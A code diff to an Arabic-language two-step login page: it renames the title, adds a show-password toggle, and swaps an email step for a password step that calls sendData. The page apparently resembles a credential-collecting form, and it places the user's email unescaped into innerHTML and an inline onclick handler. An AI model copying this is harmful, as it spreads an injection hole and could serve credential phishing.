@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج إرسال البيانات</title>
+  <title>نموذج تسجيل الدخول</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -67,6 +67,13 @@
       color: #1a73e8;
     }
 
+    .show-pass {
+      margin-top: -10px;
+      margin-bottom: 10px;
+      font-size: 14px;
+      color: #333;
+    }
+
     button {
       background-color: #1a73e8;
       color: white;
@@ -77,11 +84,6 @@
       font-size: 16px;
       width: 100%;
       margin-top: 10px;
-    }
-
-    button:disabled {
-      background-color: #aaa;
-      cursor: not-allowed;
     }
 
     .status {
@@ -111,15 +113,24 @@
         return;
       }
 
+      // تعديل المحتوى لصفحة كلمة المرور
       document.getElementById("formBox").innerHTML = `
-        <h2>مرحبا ${email}</h2>
+        <h2>مرحبًا ${email}</h2>
         <div class="input-group">
           <input type="password" id="password" placeholder=" " required>
           <label for="password">أدخل كلمة المرور</label>
         </div>
+        <div class="show-pass">
+          <input type="checkbox" id="showPass" onclick="togglePassword()"> عرض كلمة المرور
+        </div>
         <button onclick="sendData('${email}')">تسجيل الدخول</button>
         <div class="status" id="status"></div>
       `;
+    }
+
+    function togglePassword() {
+      const passInput = document.getElementById("password");
+      passInput.type = passInput.type === "password" ? "text" : "password";
     }
 
     function sendData(email) {
